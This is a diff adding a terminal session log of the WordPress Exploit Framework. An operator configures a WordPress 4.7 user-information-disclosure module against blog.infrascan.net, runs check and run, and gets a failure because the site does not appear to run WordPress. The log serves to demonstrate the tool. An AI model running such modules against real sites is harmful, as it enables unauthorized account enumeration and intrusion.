@@ -1,0 +1,70 @@
+[H[2J[3J
+[0m[33m[1m                      /\
+[0m[33m[1m          _.--''-- , / /
+[0m[33m[1m  ,---- .'          /_/
+[0m[33m[1m   '---',  .  _  .    ;
+[0m[33m[1m        ._  __ __      \
+[0m[33m[1m       , _)        .-'  y      [0m[97m[1mWordPress Exploit Framework
+[0m[33m[1m       -          (_..   :     [0m[97mVersion 2.0.1
+[0m[33m[1m      ; ...  ... (\     \ '
+[0m[33m[1m      _  \ \ \ \  /      ; :   [0m[97m[1mAuxiliaries: [0m[32m58
+[0m[33m[1m     ( t  \ \/\ \/  _   '  l   [0m[97m[1mExploits:    [0m[32m288
+[0m[33m[1m     \ |   \/  \/  i )- ' /    [0m[97m[1mPayloads:    [0m[32m7
+[0m[33m[1m      - '._        | /  ,'
+[0m[33m[1m       ..   ' - ''  -j ,
+[0m[33m[1m      (  '.___.. --'.
+[0m[33m[1m       '.______..--'
+
+[4;94;49mwpxf[0m > [?25l[1G[K[1G[0m[4;94;49mwpxf[0m > [0m[?25h[8G[?25l[1G[K[?25h[1G[4;94;49mwpxf[0m > y
+[1G
+[0;31;49m  [!] [0m"y" is not a recognised command.
+
+[4;94;49mwpxf[0m > [?25l[1G[K[1G[0m[4;94;49mwpxf[0m > [0m[?25h[8G[?25l[1G[K[?25h[1G[4;94;49mwpxf[0m > use auxiliary/info/wp_v4.7_user_info_disclosure
+[1G
+[0;32;49m  [+] [0mLoaded module: #<Wpxf::Auxiliary::Wp47UserInfoDisclosure:0x00007f1c8ec693d0>
+
+[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > [?25l[1G[K[1G[0m[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > [0m[?25h[54G[?25l[1G[K[?25h[1G[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > set host blog.infrascan.net 
+[1G
+[0;32;49m  [+] [0mSet host => blog.infrascan.net
+
+[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > [?25l[1G[K[1G[0m[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > [0m[?25h[54G[?25l[1G[K[?25h[1G[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > set port 443
+[1G
+[0;32;49m  [+] [0mSet port => 443
+
+[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > [?25l[1G[K[1G[0m[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > [0m[?25h[54G[?25l[1G[K[?25h[1G[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > set ssl true
+[1G
+[0;32;49m  [+] [0mSet ssl => true
+
+[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > [?25l[1G[K[1G[0m[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > [0m[?25h[54G[?25l[1G[K[?25h[1G[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > set target_uri /
+[1G
+[0;32;49m  [+] [0mSet target_uri => /
+
+[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > [?25l[1G[K[1G[0m[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > [0m[?25h[54G[?25l[1G[K[?25h[1G[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > set vhost blog.infrascan.net
+[1G
+[0;32;49m  [+] [0mSet vhost => blog.infrascan.net
+
+[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > [?25l[1G[K[1G[0m[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > [0m[?25h[54G[?25l[1G[K[?25h[1G[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > show options
+[1G
+  Module options:
+
+    Name         Current Setting      Required   Description                              
+    ----------   ------------------   --------   --------------------------------------   
+    host         blog.infrascan.net   true       Address of the target host.              
+    port         443                  true       Port the remote host is listening on     
+    proxy                             false      Proxy address ([protocol://]host:port)   
+    ssl          true                 true       Use SSL/HTTPS for all requests           
+    target_uri   /                    true       Base path to the WordPress application   
+    verbose      false                true       Enable verbose output                    
+    vhost        blog.infrascan.net   false      HTTP server virtual host                 
+
+[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > [?25l[1G[K[1G[0m[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > [0m[?25h[54G[?25l[1G[K[?25h[1G[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > check
+[1G
+[0;31;49m  [!] [0mCould not determine if the target is vulnerable
+
+[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > [?25l[1G[K[1G[0m[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > [0m[?25h[54G[?25l[1G[K[?25h[1G[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > run
+[1G
+[0;31;49m  [!] [0mhttps://blog.infrascan.net/ does not appear to be running WordPress
+[0;31;49m  [!] [0mExecution failed
+
+[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > [?25l[1G[K[1G[0m[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > [0m[?25h[54G[?25l[1G[K[?25h[1G[4;94;49mwpxf[0m [auxiliary/info/wp_v4.7_user_info_disclosure] > exit
+[1G[H[2J[3J
